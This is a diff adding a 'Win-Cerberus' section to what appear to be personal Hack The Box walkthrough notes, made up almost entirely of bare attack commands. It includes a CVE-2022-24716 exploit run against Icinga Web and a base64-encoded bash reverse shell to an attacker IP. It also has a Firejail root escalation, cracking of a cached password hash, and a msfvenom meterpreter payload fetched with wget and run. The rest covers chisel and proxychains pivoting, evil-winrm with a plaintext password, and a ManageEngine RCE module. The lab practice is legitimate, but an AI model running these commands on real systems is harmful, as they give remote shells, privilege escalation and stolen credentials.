@@ -12,6 +12,62 @@ john hash_admin -w=/usr/share/wordlists/rockyou.txt
 ```
 
 
+# Win-Cerberus
+```
+nano /etc/hosts
+http://icinga.cerberus.local:8080/icingaweb2/authentication/login
+https://github.com/doosec101/CVE-2022-24716
+python3 exploit.py -h
+python3 exploit.py http://icinga.cerberus.local:8080/icingaweb2 /etc/icingaweb2/resources.ini
+http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini
+openssl genrsa -out private-key.pem 1024
+Configuration – Application: Create a New Resource
+../../../../../../../../../../../../dev/shm/test.txt
+python3 exploit.py http://icinga.cerberus.local:8080/icingaweb2 /dev/shm/test.txt
+echo "sh -i >& /dev/tcp/10.10.14.2/10001 0>&1" | base64 -w 0
+../../../../../dev/shm/training/configuration.php
+Module path: /dev/shm/
+Triger: Click Access Control
+python3 exploit.py http://icinga.cerberus.local:8080/icingaweb2 /dev/shm/training/configuration.php
+python3 -c 'import pty; pty.spawn("/bin/bash")’
+find / -perm -4000 2>/dev/null
+firejail --version
+https://www.openwall.com/lists/oss-security/2022/06/08/10/1
+./firejoin.py
+firejail --join=3089
+su -
+ifconfig
+ps aux | grep root
+cd /var/lib/sss/db
+strings cache_cerberus.local.ldb | sort -u | head
+john hash -w=/usr/share/wordlists/rockyou.txt
+msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.10.14.2 lport=10002 -f elf -o shell
+use exploit/multi/handler
+run -j
+use auxiliary/server/socks_proxy
+run -j
+nano /etc/proxychains4.conf
+wget http://10.10.14.2:8000/shell
+./shell &
+use post/multi/manage/autoroute
+proxychains evil-winrm -i 172.16.22.1 -u matthew -p 147258369
+netstat -ano | select-string LIST
+cat /etc/hosts
+git clone https://github.com/jpillora/chisel.git
+./chisel_1.9.0_linux_amd64 server --socks5 -p 6666 --reverse
+iwr('http://10.10.14.2:8000/chisel_1.9.0_windows_amd64') -outfile chisel.exe
+start-process -filepath .\chisel.exe -args "client 10.10.14.2:6666 R:8888:socks"
+nano /etc/proxychains4.conf
+New SOCKS proxy
+https://dc.cerberus.local:9251
+wget https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966.rb
+cd "C:\program files (x86)\manageengine\ADSelfService Plus\backup“
+download OfflineBackup_20230214064809.ezip
+7z x OfflineBackup_20230214064809.ezip
+grep -i issuer_url *
+```
+
+
 # Win-Conceal
 https://0xdf.gitlab.io/2019/05/18/htb-conceal.html
 ```
